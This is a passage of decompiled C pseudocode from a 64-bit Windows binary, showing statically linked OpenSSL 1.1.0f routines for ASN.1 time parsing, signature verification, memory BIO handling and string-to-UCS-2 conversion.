    if ( (unsigned int)sub_1400475D0(a1, a2, v6) )
    {
      *(_DWORD *)(a1 + 4) = 24;
      return 1i64;
    }
  }
  return 0i64;
}

//----- (00000001400BD890) ----------------------------------------------------
__int64 __fastcall sub_1400BD890(int *a1, int *a2)
{
  __int64 v4; // r11
  unsigned int v5; // ebp
  int v6; // ebx
  __int64 v7; // r14
  int v8; // r8d
  __int64 v9; // rdx
  __int64 v10; // r10
  __int64 v11; // r12
  unsigned __int8 v12; // al
  char v13; // al
  __int64 v14; // rdx
  int v15; // ecx
  char v16; // al
  int v17; // r9d
  __int64 v18; // rax
  int v19; // edx
  char v20; // cl
  char v21; // cl
  int v22; // esi
  int v23; // r10d
  __int64 v24; // rdx
  char *v25; // r8
  char v26; // r9
  int v27; // r9d

  if ( a2[1] != 24 )
    return 0i64;
  v4 = *((_QWORD *)a2 + 1);
  v5 = 0;
  v6 = 0;
  v7 = *a2;
  if ( (int)v7 >= 13 )
  {
    v8 = 0;
    v9 = 0i64;
    v10 = 0i64;
    v11 = 0x800000000005i64;
    while ( 1 )
    {
      if ( v8 == 6 )
      {
        v12 = *(_BYTE *)(v9 + v4) - 43;
        if ( v12 <= 0x2Fu )
        {
          if ( _bittest64(&v11, (char)v12) )
            break;
        }
      }
      v13 = *(_BYTE *)(v9 + v4);
      if ( v13 < 48 )
        return 0i64;
      if ( v13 > 57 )
        return 0i64;
      v14 = v9 + 1;
      v15 = v13;
      if ( v14 > v7 )
        return 0i64;
      v16 = *(_BYTE *)(v14 + v4);
      if ( v16 < 48 )
        return 0i64;
      if ( v16 > 57 )
        return 0i64;
      v6 += 2;
      v9 = v14 + 1;
      v17 = v16 + 2 * (5 * v15 - 264);
      if ( v9 > v7 || v17 < dword_140122D30[v10] || v17 > dword_140122D58[v10] )
        return 0i64;
      if ( a1 )
      {
        switch ( v8 )
        {
          case 0:
            a1[5] = 100 * (v17 - 19);
            break;
          case 1:
            a1[5] += v17;
            break;
          case 2:
            a1[4] = v17 - 1;
            break;
          case 3:
            a1[3] = v17;
            break;
          case 4:
            a1[2] = v17;
            break;
          case 5:
            a1[1] = v17;
            break;
          case 6:
            *a1 = v17;
            break;
          default:
            break;
        }
      }
      ++v8;
      ++v10;
      if ( v8 >= 7 )
        goto LABEL_29;
    }
    if ( a1 )
      *a1 = 0;
LABEL_29:
    if ( *(_BYTE *)(v6 + v4) != 46 )
      goto LABEL_36;
    if ( ++v6 <= (int)v7 )
    {
      v18 = v6;
      v19 = v6;
      v20 = *(_BYTE *)(v6 + v4);
      if ( v20 >= 48 )
      {
        do
        {
          if ( v20 > 57 )
            break;
          if ( v18 > v7 )
            break;
          v20 = *(_BYTE *)(v18 + v4 + 1);
          ++v18;
          ++v6;
        }
        while ( v20 >= 48 );
        if ( v19 != v6 )
        {
LABEL_36:
          v21 = *(_BYTE *)(v6 + v4);
          if ( v21 == 90 )
          {
            LOBYTE(v5) = v6 + 1 == (_DWORD)v7;
            return v5;
          }
          if ( ((v21 - 43) & 0xFD) != 0 )
          {
            if ( !v21 )
            {
LABEL_58:
              LOBYTE(v5) = v6 == (_DWORD)v7;
              return v5;
            }
          }
          else
          {
            v22 = -1;
            v23 = 0;
            if ( v21 == 45 )
              v22 = 1;
            if ( ++v6 + 4 <= (int)v7 )
            {
              v24 = 7i64;
              v25 = (char *)(v4 + v6);
              while ( (unsigned __int8)(*v25 - 48) <= 9u )
              {
                v26 = v25[1];
                if ( (unsigned __int8)(v26 - 48) > 9u )
                  break;
                v27 = v26 + 2 * (5 * *v25 - 264);
                if ( v27 < dword_140122D30[v24] || v27 > dword_140122D58[v24] )
                  break;
                if ( a1 )
                {
                  if ( v24 == 7 )
                  {
                    v23 = 3600 * v27;
                  }
                  else if ( v24 == 8 )
                  {
                    v23 += 60 * v27;
                  }
                }
                v6 += 2;
                v25 += 2;
                if ( ++v24 >= 9 )
                {
                  if ( v23 && !(unsigned int)sub_1400BCAB0(a1, 0, v22 * v23) )
                    return 0i64;
                  goto LABEL_58;
                }
              }
            }
          }
        }
      }
    }
  }
  return 0i64;
}
// 140122D30: using guessed type int dword_140122D30[];
// 140122D58: using guessed type int dword_140122D58[10];

//----- (00000001400BDB80) ----------------------------------------------------
__int64 __fastcall sub_1400BDB80(__int64 a1)
{
  __int64 v2; // rax
  int v3; // eax
  __int64 v4; // rdi
  __FrameHandler3::TryBlockMap *v5; // rbx
  unsigned int v6; // ebx
  __int64 (*v7)(void); // rax
  __int64 v8; // rax
  struct _xDISPATCHER_CONTEXT *v10; // [rsp+38h] [rbp+10h] BYREF

  v2 = sub_1400252A0(a1);
  v3 = sub_14002C260(v2);
  if ( !v3 )
    return 0i64;
  v4 = sub_1400BDC60(v3);
  if ( !v4 )
    return 0i64;
  v5 = (__FrameHandler3::TryBlockMap *)sub_1400AC9D0(a1);
  v10 = __FrameHandler3::TryBlockMap::getpDC(v5);
  v6 = sub_14001D4F0((unsigned int *)v5);
  v7 = *(__int64 (**)(void))(v4 + 8);
  if ( !v7 )
    return (*(__int64 (__fastcall **)(_QWORD, struct _xDISPATCHER_CONTEXT **, _QWORD))(v4 + 32))(0i64, &v10, v6);
  v8 = v7();
  return sub_1400516D0(0i64, (char **)&v10, v6, v8);
}

//----- (00000001400BDC30) ----------------------------------------------------
__int64 __fastcall sub_1400BDC30(__int64 a1)
{
  __int64 v1; // rax
  int v2; // eax

  v1 = sub_1400252A0(a1);
  v2 = sub_14002C260(v1);
  if ( v2 )
    return sub_1400BDC60(v2);
  else
    return 0i64;
}

//----- (00000001400BDC60) ----------------------------------------------------
__int64 __fastcall sub_1400BDC60(int a1)
{
  __int64 v2; // rax
  int v3; // eax
  int v4[30]; // [rsp+30h] [rbp-78h] BYREF
  int *v5; // [rsp+B8h] [rbp+10h] BYREF

  v5 = v4;
  if ( a1 < 0 )
    return 0i64;
  v4[0] = a1;
  v2 = sub_14002BCB0(
         (__int64)&v5,
         (__int64)off_14013D230,
         46,
         8,
         (__int64 (__fastcall *)(__int64, __int64))sub_140020A60);
  if ( v2 )
    return *(_QWORD *)v2;
  if ( !qword_1401434F0 )
    return 0i64;
  v3 = sub_140029490((int *)qword_1401434F0, (__int64)v4);
  if ( v3 == -1 )
    return 0i64;
  return sub_140029880(qword_1401434F0, v3);
}
// 14013D230: using guessed type char *off_14013D230[2];
// 1401434F0: using guessed type __int64 qword_1401434F0;

//----- (00000001400BDD00) ----------------------------------------------------
__int64 __fastcall sub_1400BDD00(unsigned int *a1, int a2, _DWORD *a3, int *a4)
{
  __int64 v4; // rbx
  int v10; // eax
  int v11; // edi
  __int64 v12; // rbp
  __int64 v13; // rax
  int v14; // eax

  v4 = 0i64;
  if ( !a1 )
  {
    if ( a4 )
      *a4 = -1;
    if ( a3 )
      *a3 = -1;
    return 0i64;
  }
  if ( a4 )
    v10 = *a4 + 1;
  else
    v10 = 0;
  v11 = 0;
  if ( v10 >= 0 )
    v11 = v10;
  if ( v11 >= (int)sub_1400296E0(a1) )
  {
LABEL_26:
    if ( a4 )
      *a4 = -1;
    if ( a3 )
      *a3 = -1;
    return 0i64;
  }
  while ( 1 )
  {
    v12 = sub_140029880((__int64)a1, v11);
    v13 = sub_1400252A0(v12);
    if ( (unsigned int)sub_14002C260(v13) == a2 )
      break;
LABEL_17:
    if ( ++v11 >= (int)sub_1400296E0(a1) )
      goto LABEL_22;
  }
  if ( !a4 )
  {
    if ( v4 )
    {
      if ( a3 )
        *a3 = -2;
      return 0i64;
    }
    v4 = v12;
    goto LABEL_17;
  }
  *a4 = v11;
  v4 = v12;
LABEL_22:
  if ( !v4 )
    goto LABEL_26;
  if ( a3 )
  {
    LOBYTE(v14) = sub_1400AC9C0(v4);
    *a3 = v14;
  }
  return sub_1400BDB80(v4);
}
// 1400BDDE4: variable 'v14' is possibly undefined

//----- (00000001400BDE30) ----------------------------------------------------
void *sub_1400BDE30()
{
  return &unk_140122F50;
}

//----- (00000001400BDE40) ----------------------------------------------------
__int64 __fastcall sub_1400BDE40(int a1, __int64 *a2)
{
  __int64 v2; // rbx
  __int64 result; // rax

  v2 = *a2;
  if ( a1 != 1 )
    return 1i64;
  result = (__int64)sub_1400296C0();
  *(_QWORD *)(v2 + 40) = result;
  if ( result )
    return 1i64;
  return result;
}

//----- (00000001400BDE80) ----------------------------------------------------
void *sub_1400BDE80()
{
  return &unk_140123000;
}

//----- (00000001400BDE90) ----------------------------------------------------
__int64 __fastcall sub_1400BDE90(__int64 a1, int *a2, unsigned int *a3, __int64 a4, _DWORD *a5)
{
  int v7; // eax
  unsigned __int8 *v9; // [rsp+30h] [rbp-18h] BYREF

  v9 = 0i64;
  v7 = sub_1400536F0(a3, &v9, a1);
  if ( !v9 )
    return 0i64;
  if ( !(unsigned int)sub_14006D970((__int64)v9, v7, a4, a5, a2, 0i64) )
  {
    sub_14001D930(v9);
    return 0i64;
  }
  sub_14001D930(v9);
  return 1i64;
}

//----- (00000001400BDF30) ----------------------------------------------------
__int64 __fastcall sub_1400BDF30(__int64 a1, __int64 *a2, int *a3, unsigned int *a4, __int64 a5)
{
  int v5; // eax
  __int64 v6; // rbp
  unsigned int v7; // ebx
  void *v13; // rsi
  int v14; // eax
  __int64 v15; // rax
  __int64 (__fastcall *v16)(void *, __int64, unsigned int *, __int64 *, int *, __int64); // r10
  __int64 v17; // rbp
  char *v18; // rax
  int *v19; // r14
  int v20; // [rsp+20h] [rbp-38h]
  int v21; // [rsp+30h] [rbp-28h] BYREF
  unsigned __int8 *v22; // [rsp+38h] [rbp-20h] BYREF

  v6 = a5;
  v7 = -1;
  v22 = 0i64;
  if ( !a5 )
  {
    sub_140024610(v5 - 51, 197, v5 + 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 97);
    return 0xFFFFFFFFi64;
  }
  if ( a3[1] == 3 && (a3[4] & 7) != 0 )
  {
    sub_140024610(13, 197, 220, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 102);
    return 0xFFFFFFFFi64;
  }
  v13 = sub_14006DFD0();
  if ( v13 )
  {
    v14 = sub_14002C260(*a2);
    if ( !(unsigned int)sub_140035DA0(v14, &a5, &v21) )
    {
      v20 = 114;
LABEL_10:
      sub_140024610(13, 197, 199, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", v20);
      goto LABEL_31;
    }
    if ( (_DWORD)a5 )
    {
      v18 = sub_14002C1A0(a5);
      v19 = (int *)sub_14001E990((__int64)v18);
      if ( !v19 )
      {
        sub_140024610(13, 197, 161, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 137);
        goto LABEL_31;
      }
      if ( (unsigned int)sub_14001D740(v21) != **(_DWORD **)(v6 + 16) )
      {
        sub_140024610(13, 197, 200, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 143);
        goto LABEL_31;
      }
      if ( !(unsigned int)sub_14006E3F0((__int64)v13, 0i64, v19, 0i64, v6) )
      {
        sub_140024610(13, 197, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 148);
        goto LABEL_25;
      }
    }
    else
    {
      v15 = *(_QWORD *)(v6 + 16);
      if ( !v15
        || (v16 = *(__int64 (__fastcall **)(void *, __int64, unsigned int *, __int64 *, int *, __int64))(v15 + 200)) == 0i64 )
      {
        v20 = 120;
        goto LABEL_10;
      }
      v7 = v16(v13, a1, a4, a2, a3, v6);
      if ( v7 != 2 )
        goto LABEL_31;
    }
    v17 = (unsigned int)sub_1400536F0(a4, &v22, a1);
    if ( !v22 )
    {
      sub_140024610(13, 197, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 158);
      v7 = -1;
      goto LABEL_31;
    }
    v7 = sub_14006DD90((__int64)v13);
    sub_14001DA40(v22, v17, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 0xA4u);
    if ( !v7 )
    {
      sub_140024610(13, 197, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 167);
      goto LABEL_31;
    }
    if ( (int)sub_14006E2C0((__int64)v13, *((_QWORD *)a3 + 1), *a3) > 0 )
    {
      v7 = 1;
      goto LABEL_31;
    }
    sub_140024610(13, 197, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 174);
LABEL_25:
    v7 = 0;
    goto LABEL_31;
  }
  sub_140024610(13, 197, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_verify.c", 108);
LABEL_31:
  sub_14006DF90(v13);
  return v7;
}
// 1400BDF8B: variable 'v5' is possibly undefined

//----- (00000001400BE210) ----------------------------------------------------
char *__fastcall sub_1400BE210(_BYTE *a1, int a2, _QWORD *a3, int *a4)
{
  __int64 v4; // rbx
  unsigned int v8; // edx
  _BYTE *i; // rax
  int v10; // ebp
  int v11; // esi
  char *result; // rax
  char *v13; // r8
  char *v14; // rcx
  __int64 v15; // rdx
  __int64 v16; // rax

  v4 = 0i64;
  if ( a2 == -1 )
  {
    v8 = 0;
    for ( i = a1; *i; ++v8 )
    {
      if ( v8 >= 0x80000000 )
        break;
      ++i;
    }
    a2 = v8 & 0x7FFFFFFF;
  }
  v10 = 2 * a2;
  v11 = 2 * a2 + 2;
  result = (char *)sub_14001D8E0(v11);
  v13 = result;
  if ( result )
  {
    if ( v10 > 0 )
    {
      v14 = result + 1;
      v15 = ((unsigned int)(v10 - 1) >> 1) + 1;
      do
      {
        *(v14 - 1) = 0;
        v16 = v4 >> 1;
        v14 += 2;
        v4 += 2i64;
        *(v14 - 2) = a1[v16];
        --v15;
      }
      while ( v15 );
    }
    v13[v11 - 2] = 0;
    v13[v11 - 1] = 0;
    if ( a4 )
      *a4 = v11;
    if ( a3 )
      *a3 = v13;
    return v13;
  }
  return result;
}

//----- (00000001400BE310) ----------------------------------------------------
char *__fastcall sub_1400BE310(_BYTE *a1, int a2, _QWORD *a3, int *a4)
{
  int v4; // esi
  int v7; // ebx
  _BYTE *v9; // rax
  unsigned int i; // ebx
  int v11; // ebp
  int v12; // edi
  int v13; // eax
  int v14; // ecx
  int v15; // ebp
  _BYTE *v16; // rax
  _BYTE *v17; // r15
  _BYTE *v18; // rdi
  int v19; // eax
  unsigned int v20; // edx
  unsigned int v21; // ecx
  __int16 v22; // dx
  _BYTE *v23; // rdi
  unsigned int v25; // [rsp+58h] [rbp+10h] BYREF

  v4 = 0;
  v25 = 0;
  v7 = a2;
  if ( a2 == -1 )
  {
    v9 = a1;
    for ( i = 0; *v9; ++i )
    {
      if ( i >= 0x80000000 )
        break;
      ++v9;
    }
    v7 = i & 0x7FFFFFFF;
  }
  v11 = 0;
  v12 = 0;
  if ( v7 <= 0 )
  {
LABEL_12:
    v15 = v11 + 2;
    v16 = sub_14001D8E0(v15);
    v17 = v16;
    if ( v16 )
    {
      v18 = v16;
      if ( v7 > 0 )
      {
        do
        {
          v19 = sub_1400AA130(&a1[v4], v7 - v4, &v25);
          v20 = v25;
          if ( v25 < 0x10000 )
          {
            *v18 = BYTE1(v25);
            v23 = v18 + 1;
            *v23 = v25;
          }
          else
          {
            v25 -= 0x10000;
            v21 = ((v20 - 0x10000) >> 10) + 55296;
            v22 = (v20 & 0x3FF) - 9216;
            *v18 = BYTE1(v21);
            v18[1] = v21;
            v18[2] = HIBYTE(v22);
            v23 = v18 + 3;
            *v23 = v22;
          }
          v4 += v19;
          v18 = v23 + 1;
        }
        while ( v4 < v7 );
      }
      *(_WORD *)v18 = 0;
      if ( a4 )
        *a4 = v15;
      if ( a3 )
        *a3 = v17;
      return v17;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    while ( 1 )
    {
      v13 = sub_1400AA130(&a1[v12], v7 - v12, &v25);
      if ( v13 < 0 )
        return sub_1400BE210(a1, v7, a3, a4);
      if ( v25 > 0x10FFFF )
        return 0i64;
      v14 = 2;
      if ( v25 >= 0x10000 )
        v14 = 4;
      v12 += v13;
      v11 += v14;
      if ( v12 >= v7 )
        goto LABEL_12;
    }
  }
}

//----- (00000001400BE4C0) ----------------------------------------------------
__int64 __fastcall sub_1400BE4C0(__int64 a1, const void *a2, int a3)
{
  int v3; // eax
  int **v4; // rdi
  size_t v6; // rbp
  __int64 result; // rax
  __int64 v9; // r14
  int *v10; // rcx
  int *v11; // rdx

  v4 = *(int ***)(a1 + 48);
  v6 = a3;
  if ( a2 )
  {
    if ( (*(_DWORD *)(a1 + 32) & 0x200) != 0 )
    {
      sub_140024610(32, 117, 126, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_mem.c", 211);
      return 0xFFFFFFFFi64;
    }
    else
    {
      sub_140029A60(a1, 15);
      v9 = *v4[1];
      sub_1400BEBB0(a1);
      if ( sub_140082440((__int64)*v4, (int)v9 + (int)v6) )
      {
        memmove((void *)(*((_QWORD *)*v4 + 1) + v9), a2, v6);
        v10 = *v4;
        result = (unsigned int)v6;
        v11 = v4[1];
        *(_OWORD *)v11 = *(_OWORD *)*v4;
        *((_OWORD *)v11 + 1) = *((_OWORD *)v10 + 1);
      }
      else
      {
        return 0xFFFFFFFFi64;
      }
    }
  }
  else
  {
    sub_140024610(v3 - 16, v3 + 69, v3 + 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_mem.c", 207);
    return 0xFFFFFFFFi64;
  }
  return result;
}
// 1400BE501: variable 'v3' is possibly undefined

//----- (00000001400BE5C0) ----------------------------------------------------
__int64 __fastcall sub_1400BE5C0(__int64 a1, void *a2, int a3)
{
  unsigned __int64 v4; // rsi
  __int64 v6; // rdi
  unsigned int v8; // ebx

  v4 = a3;
  v6 = *(_QWORD *)(*(_QWORD *)(a1 + 48) + 8i64);
  sub_140029A60(a1, 15);
  if ( (v4 & 0x80000000) == 0i64 && v4 > *(_QWORD *)v6 )
    LODWORD(v4) = *(_DWORD *)v6;
  if ( a2 && (int)v4 > 0 )
  {
    memmove(a2, *(const void **)(v6 + 8), (int)v4);
    *(_QWORD *)v6 -= (int)v4;
    *(_QWORD *)(v6 + 8) += (int)v4;
    return (unsigned int)v4;
  }
  if ( *(_QWORD *)v6 )
    return (unsigned int)v4;
  v8 = *(_DWORD *)(a1 + 40);
  if ( v8 )
    sub_14002A400(a1, 9);
  return v8;
}

//----- (00000001400BE670) ----------------------------------------------------
__int64 __fastcall sub_1400BE670(__int64 a1, _BYTE *a2)
{
  unsigned int v2; // r8d
  _BYTE *i; // rax

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  return sub_1400BE4C0(a1, a2, v2 & 0x7FFFFFFF);
}

//----- (00000001400BE6C0) ----------------------------------------------------
__int64 __fastcall sub_1400BE6C0(__int64 a1, _BYTE *a2, int a3)
{
  __int64 v6; // rsi
  int v7; // ecx
  int v9; // ebx
  __int64 i; // rax
  __int64 v11; // rsi

  v6 = *(_QWORD *)(*(_QWORD *)(a1 + 48) + 8i64);
  sub_140029A60(a1, 15);
  v7 = *(_DWORD *)v6;
  if ( a3 - 1 < *(_DWORD *)v6 )
    v7 = a3 - 1;
  if ( v7 <= 0 )
  {
    *a2 = 0;
    return 0i64;
  }
  v9 = 0;
  for ( i = 0i64; i < v7; ++i )
  {
    ++v9;
    if ( *(_BYTE *)(i + *(_QWORD *)(v6 + 8)) == 10 )
      break;
  }
  v11 = *(_QWORD *)(*(_QWORD *)(a1 + 48) + 8i64);
  sub_140029A60(a1, 15);
  if ( v9 >= 0 && (unsigned __int64)v9 > *(_QWORD *)v11 )
    v9 = *(_DWORD *)v11;
  if ( a2 && v9 > 0 )
  {
    memmove(a2, *(const void **)(v11 + 8), v9);
    *(_QWORD *)v11 -= v9;
    *(_QWORD *)(v11 + 8) += v9;
    goto LABEL_17;
  }
  if ( *(_QWORD *)v11 )
  {
LABEL_17:
    if ( v9 > 0 )
      a2[v9] = 0;
    return (unsigned int)v9;
  }
  v9 = *(_DWORD *)(a1 + 40);
  if ( v9 )
  {
    sub_14002A400(a1, 9);
    goto LABEL_17;
  }
  return (unsigned int)v9;
}

//----- (00000001400BE7C0) ----------------------------------------------------
__int64 __fastcall sub_1400BE7C0(__int64 a1, int a2, int a3, __int64 a4)
{
  int v4; // eax
  _QWORD *v5; // rdi
  unsigned int v6; // ebx
  _QWORD *v10; // r14
  void *v11; // rcx
  __int64 v12; // rax
  _OWORD *v13; // rcx
  unsigned int *v14; // rax
  _OWORD *v15; // rax

  v5 = *(_QWORD **)(a1 + 48);
  v6 = v4 - 31;
  switch ( a2 )
  {
    case 1:
      v10 = (_QWORD *)*v5;
      v11 = *(void **)(*v5 + 8i64);
      if ( v11 )
      {
        if ( (*(_DWORD *)(a1 + 32) & 0x600) != 0 )
        {
          *v10 = v10[2];
        }
        else
        {
          memset(v11, 0, v10[2]);
          *v10 = 0i64;
        }
        v12 = *v5;
        v13 = (_OWORD *)v5[1];
        *v13 = *(_OWORD *)*v5;
        v13[1] = *(_OWORD *)(v12 + 16);
      }
      break;
    case 2:
      v6 = *(_QWORD *)v5[1] == 0i64;
      break;
    case 3:
      v14 = (unsigned int *)v5[1];
      v6 = *v14;
      if ( a4 )
        *(_QWORD *)a4 = *((_QWORD *)v14 + 1);
      break;
    case 8:
      v6 = *(_DWORD *)(a1 + 28);
      break;
    case 9:
      *(_DWORD *)(a1 + 28) = a3;
      break;
    case 10:
      v6 = *(_DWORD *)v5[1];
      break;
    case 11:
    case 12:
      return v6;
    case 114:
      sub_1400BEB00(a1, 0);
      *(_DWORD *)(a1 + 28) = a3;
      v15 = (_OWORD *)v5[1];
      *v5 = a4;
      *v15 = *(_OWORD *)a4;
      v15[1] = *(_OWORD *)(a4 + 16);
      *(_QWORD *)(a1 + 48) = v5;
      break;
    case 115:
      if ( a4 )
      {
        sub_1400BEBB0(a1);
        *(_QWORD *)a4 = v5[1];
      }
      break;
    case 130:
      *(_DWORD *)(a1 + 40) = a3;
      break;
    default:
      v6 = 0;
      break;
  }
  return v6;
}
// 1400BE7E7: variable 'v4' is possibly undefined

//----- (00000001400BE9C0) ----------------------------------------------------
__int64 __fastcall sub_1400BE9C0(__int64 a1)
{
  return sub_1400BEC30(a1, 0);
}

//----- (00000001400BE9E0) ----------------------------------------------------
__int64 __fastcall sub_1400BE9E0(__int64 a1)
{
  int v1; // eax

  return sub_1400BEC30(a1, v1 - 39);
}
// 1400BE9ED: variable 'v1' is possibly undefined

//----- (00000001400BEA00) ----------------------------------------------------
__int64 __fastcall sub_1400BEA00(__int64 a1)
{
  int v1; // eax

  return sub_1400BEB00(a1, v1 - 39);
}
// 1400BEA0D: variable 'v1' is possibly undefined

//----- (00000001400BEA20) ----------------------------------------------------
__int64 *__fastcall sub_1400BEA20(_BYTE *a1, int a2)
{
  int v2; // eax
  _BYTE *v3; // rdi
  __int64 *result; // rax
  unsigned int i; // eax
  __int64 v6; // rbx
  __int64 *v7; // rdx
  __int64 v8; // rcx
  _QWORD *v9; // rax
  _OWORD *v10; // rax
  _OWORD *v11; // rcx
  __int128 v12; // xmm1

  v3 = a1;
  if ( a1 )
  {
    if ( a2 >= 0 )
    {
      v6 = a2;
    }
    else
    {
      for ( i = 0; *a1; ++i )
      {
        if ( i >= 0x80000000 )
          break;
        ++a1;
      }
      v6 = i;
      LODWORD(v6) = i & 0x7FFFFFFF;
    }
    result = sub_140029FE0((__int64)&unk_1401231F0);
    v7 = result;
    if ( result )
    {
      v8 = result[6];
      v9 = *(_QWORD **)v8;
      *v9 = v6;
      v9[2] = v6;
      v9[1] = v3;
      v10 = *(_OWORD **)v8;
      v11 = *(_OWORD **)(v8 + 8);
      *v11 = *v10;
      v12 = v10[1];
      result = v7;
      v11[1] = v12;
      *((_DWORD *)v7 + 8) |= 0x200u;
      *((_DWORD *)v7 + 10) = 0;
    }
  }
  else
  {
    sub_140024610(v2 - 16, v2 + 78, v2 + 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_mem.c", 81);
    return 0i64;
  }
  return result;
}
// 1400BEA49: variable 'v2' is possibly undefined

//----- (00000001400BEAF0) ----------------------------------------------------
void *sub_1400BEAF0()
{
  return &unk_1401231F0;
}

//----- (00000001400BEB00) ----------------------------------------------------
__int64 __fastcall sub_1400BEB00(__int64 a1, int a2)
{
  void *v5; // rdi
  __int64 v6; // rcx

  if ( !a1 )
    return 0i64;
  if ( *(_DWORD *)(a1 + 28) )
  {
    if ( *(_DWORD *)(a1 + 24) )
    {
      v5 = *(void **)(a1 + 48);
      if ( v5 )
      {
        v6 = *(_QWORD *)v5;
        if ( (*(_DWORD *)(a1 + 32) & 0x200) != 0 )
          *(_QWORD *)(v6 + 8) = 0i64;
        sub_140082280(v6);
        if ( a2 )
        {
          sub_14001D930(*((void **)v5 + 1));
          sub_14001D930(v5);
        }
        *(_QWORD *)(a1 + 48) = 0i64;
      }
    }
  }
  return 1i64;
}

//----- (00000001400BEBB0) ----------------------------------------------------
__int64 __fastcall sub_1400BEBB0(__int64 a1)
{
  _QWORD *v1; // rbx
  size_t *v2; // r8
  const void *v3; // rdx
  void *v4; // rcx

  if ( !a1 || !*(_DWORD *)(a1 + 24) )
    return 0i64;
  v1 = *(_QWORD **)(a1 + 48);
  if ( v1 )
  {
    v2 = (size_t *)v1[1];
    v3 = (const void *)v2[1];
    v4 = *(void **)(*v1 + 8i64);
    if ( v3 != v4 )
    {
      memmove(v4, v3, *v2);
      *(_QWORD *)*v1 = *(_QWORD *)v1[1];
      *(_QWORD *)(v1[1] + 8i64) = *(_QWORD *)(*v1 + 8i64);
    }
  }
  return 0i64;
}

//----- (00000001400BEC30) ----------------------------------------------------
__int64 __fastcall sub_1400BEC30(__int64 a1, int a2)
{
  int v2; // eax
  _QWORD *v5; // rbx
  _DWORD *v6; // rax
  __int64 result; // rax
  _OWORD *v8; // rax
  _OWORD *v9; // rcx
  _OWORD *v10; // rax
  __int128 v11; // xmm1

  v5 = sub_14001DC20((unsigned int)(v2 - 16));
  if ( !v5 )
    return 0i64;
  v6 = sub_140082600(a2);
  *v5 = v6;
  if ( !v6 )
  {
    sub_14001D930(v5);
    return 0i64;
  }
  v8 = sub_14001DC20(0x20ui64);
  v5[1] = v8;
  v9 = v8;
  if ( v8 )
  {
    v10 = (_OWORD *)*v5;
    *v9 = *(_OWORD *)*v5;
    v11 = v10[1];
    result = 1i64;
    v9[1] = v11;
    *(_QWORD *)(a1 + 48) = v5;
    *(_DWORD *)(a1 + 28) = 1;
    *(_DWORD *)(a1 + 24) = 1;
    *(_DWORD *)(a1 + 40) = -1;
  }
  else
  {
    sub_140082280(*v5);
    sub_14001D930(v5);
    return 0i64;
  }
  return result;
}
// 1400BEC58: variable 'v2' is possibly undefined

//----- (00000001400BED30) ----------------------------------------------------
__int64 __fastcall sub_1400BED30(__int64 a1, __int64 a2, unsigned int a3)
{
  return a3;
}

//----- (00000001400BED40) ----------------------------------------------------
unsigned int __fastcall sub_1400BED40(__int64 a1, _BYTE *a2)
{
  unsigned int result; // eax

  result = 0;
  if ( a2 )
  {
    for ( ; *a2; ++result )
    {
      if ( result >= 0x80000000 )
        break;
      ++a2;
    }
    result &= ~0x80000000;
  }
  return result;
}

//----- (00000001400BED70) ----------------------------------------------------
__int64 __fastcall sub_1400BED70(__int64 a1, int a2)
{
  __int64 result; // rax

  switch ( a2 )
  {
    case 1:
    case 2:
    case 4:
    case 9:
    case 11:
    case 12:
      result = 1i64;
      break;
    default:
      result = 0i64;
      break;
  }
  return result;
}

//----- (00000001400BEDD0) ----------------------------------------------------
__int64 __fastcall sub_1400BEDD0(__int64 a1)
{
  *(_DWORD *)(a1 + 24) = 1;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 48) = 0i64;
  return 1i64;
}

//----- (00000001400BEDF0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400BEDF0(__int64 a1)
{
  return a1 != 0;
}

//----- (00000001400BEE00) ----------------------------------------------------
void *sub_1400BEE00()
{
  return &unk_1401232F0;
}

//----- (00000001400BEE10) ----------------------------------------------------
__int64 __fastcall sub_1400BEE10(__int64 a1, __int64 a2, signed int a3)
{
  int v3; // edi
  __int64 v7; // r15
  __int64 v8; // rax
  __int64 v9; // rsi

  v3 = 0;
  if ( !a2 || a3 <= 0 )
    return 0i64;
  v7 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v8 = sub_14002A130(a1);
  v9 = v8;
  if ( v7 && v8 )
    v3 = sub_14002A430(v8, a2, a3);
  if ( !(unsigned int)sub_140029D50(a1) || v3 <= 0 || (unsigned int)sub_14006DD90(v7) )
  {
    if ( v9 )
    {
      sub_140029A60(a1, 15);
      sub_140029A70(a1);
    }
    return (unsigned int)v3;
  }
  else
  {
    sub_140029A60(a1, 15);
    return 0i64;
  }
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BEEF0) ----------------------------------------------------
__int64 __fastcall sub_1400BEEF0(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v7; // rbp
  __int64 v8; // rax
  int v9; // edi

  if ( !a2 )
    return 0i64;
  v7 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v8 = sub_14002A130(a1);
  if ( !v7 || !v8 )
    return 0i64;
  v9 = sub_14002A2C0(v8, a2, a3);
  if ( (unsigned int)sub_140029D50(a1) && v9 > 0 && (int)sub_14006DD90(v7) <= 0 )
    return 0xFFFFFFFFi64;
  sub_140029A60(a1, 15);
  sub_140029A70(a1);
  return (unsigned int)v9;
}
